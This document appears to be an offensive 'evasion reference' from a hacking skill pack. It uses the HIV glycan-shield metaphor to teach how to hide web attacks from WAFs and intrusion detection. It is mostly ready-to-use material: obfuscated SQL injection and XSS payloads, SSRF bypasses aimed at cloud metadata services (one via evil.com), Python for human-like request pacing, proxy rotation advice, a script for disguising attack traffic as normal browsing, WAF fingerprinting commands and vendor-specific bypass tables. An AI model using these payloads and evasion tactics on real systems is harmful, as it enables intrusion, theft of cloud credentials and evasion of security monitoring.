# 🛡️ Glycan Shield — Obfuscation & Anti-Detection

> *"Permukaan HIV dilapisi protein envelope yang memiliki banyak rantai gula (glycans). Lapisan ini disebut glycan shield. Ia dapat menutupi sejumlah bagian protein yang sebenarnya bisa dikenali oleh antibodi."*

---

## Concept

The glycan shield doesn't make HIV invisible. It **covers the recognizable surface** so that antibodies can't bind to the parts they're trained to detect.

WAF/IDS rules are antibodies. They're trained to recognize specific patterns — signatures. The glycan shield in web2 attack means: cover the payload's signature so detection rules find nothing to bind to.

---

## Layer 1: Request-Level Obfuscation

### HTTP Header Manipulation

```http
# Standard (detectable):
GET /search?q=<script>alert(1)</script> HTTP/1.1
User-Agent: Mozilla/5.0

# Glycan-shielded:
GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://target.com/
```

### Content-Type Confusion

```http
# WAF trained on application/json — bypass with:
Content-Type: application/json;charset=utf-8;boundary=something
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

# Or smuggle JSON in form-encoded:
POST /api/user
Content-Type: application/x-www-form-urlencoded
data=%7B%22role%22%3A%22admin%22%7D
```

---

## Layer 2: Payload-Level Obfuscation

### SQLi Glycan Shield

```sql
-- Raw (detected):
' OR 1=1--

-- Glycan variants:
' OR 1=1#
'/**/OR/**/1=1--
' OR 'unusual'='unusual'--
' OR 0x31=0x31--
' OR ASCII(1)=49--
' OR (SELECT 1)=1--
'%09OR%091=1--          (tab instead of space)
' OR	1=1--             (literal tab)
' /*!OR*/ 1=1--         (MySQL conditional comment)
' OR 1 LIKE 1--
' OR 1 BETWEEN 0 AND 2--
```

### XSS Glycan Shield

```javascript
// Raw (detected):
<script>alert(1)</script>

// Glycan variants:
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<script>alert(1//)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>
javascript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</noscript></title></textarea></style></template></noembed></script><svg onload=alert(1)>
```

### SSRF Glycan Shield

```
# Direct (blocked):
http://169.254.169.254/latest/meta-data/

# Glycan shields:
http://169.254.169.254.xip.io/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/
http://①⑥⑨。②⑤④。①⑥⑨。②⑤④/latest/meta-data/
http://0xa9fea9fe/latest/meta-data/
http://2852039166/latest/meta-data/
http://169.254.169.254:80@evil.com/latest/meta-data/ (host header abuse)
http://metadata.google.internal/computeMetadata/v1/
http://metadata/ (GCP short form)
```

---

## Layer 3: Traffic-Level Obfuscation

### Timing & Rate

```python
import time, random

def glycan_request(session, url, payload):
    """Make request with human-like timing"""
    # Random delay 2-8 seconds between requests
    time.sleep(random.uniform(2.0, 8.0))
    
    # Randomize minor request attributes
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.9", "en-GB,en;q=0.8"]),
    }
    
    return session.get(url, params=payload, headers=headers)
```

### IP Rotation (Glycan Shield for Source)

```
# Rotate through:
- Residential proxies (highest trust)
- Mobile carrier IPs (very high trust)  
- VPN exit nodes (medium trust)
- Tor exit nodes (low trust, some WAFs block)

# Never:
- Static datacenter IP
- Known scanner IP
- Same IP across multiple test sessions
```

### Protocol-Level Shield

```
# HTTP/2 → bypass HTTP/1.1-trained WAFs
# HTTP/3 (QUIC) → bypass TCP-based inspection
# WebSocket upgrade → bypass HTTP rule sets
# gRPC → binary protocol, harder for WAF to parse
# GraphQL → WAFs trained on REST miss GraphQL attacks
```

---

## Layer 4: Behavioral Obfuscation

### Look Like a Legitimate User

```
Before attacking:
1. Browse 5-10 legitimate pages
2. Generate realistic session activity
3. Login with valid credentials if available
4. Navigate at human speed
5. Accept cookies, confirm banners

During attack:
1. Mix malicious requests with legitimate ones (1:10 ratio)
2. Visit unrelated pages between attack attempts
3. Maintain session via periodic legitimate requests
4. Don't trigger rapid consecutive errors

After attack:
1. Continue browsing normally
2. Don't immediately disconnect
3. Simulate user logout flow
```

---

## WAF Fingerprinting (Know Your Antibody)

```bash
# Detect WAF type from response headers + behavior
wafw00f https://target.com

# Manual fingerprinting via error messages:
curl -s "https://target.com/?id='" | grep -i "cloudflare\|akamai\|sucuri\|imperva\|f5\|barracuda"

# Check for WAF-specific cookies:
# __cfduid, __utmz (CloudFlare)
# ak_bmsc (Akamai)
# visid_incap (Imperva/Incapsula)
```

### WAF-Specific Bypass Tables

```
CLOUDFLARE:
- Use Unicode normalization: ＜script＞
- HTTP/2 with unusual pseudo-headers
- Chunked transfer encoding

AKAMAI:
- Param pollution: ?id=1&id=<payload>
- Referer header injection
- X-Forwarded-For spoofing

IMPERVA:
- Null byte + payload: \x00<script>
- Path traversal in parameter: /normal/../attack
- Long URL padding before payload

MODSECURITY (generic):
- Comment-based bypass: se/**/lect
- Case variation: SeLeCt
- Encoding layers
```

---

*Glycan Shield — Evasion Reference*  
*Part of HIV Framework | Security--Skill by wahyunuriman999*
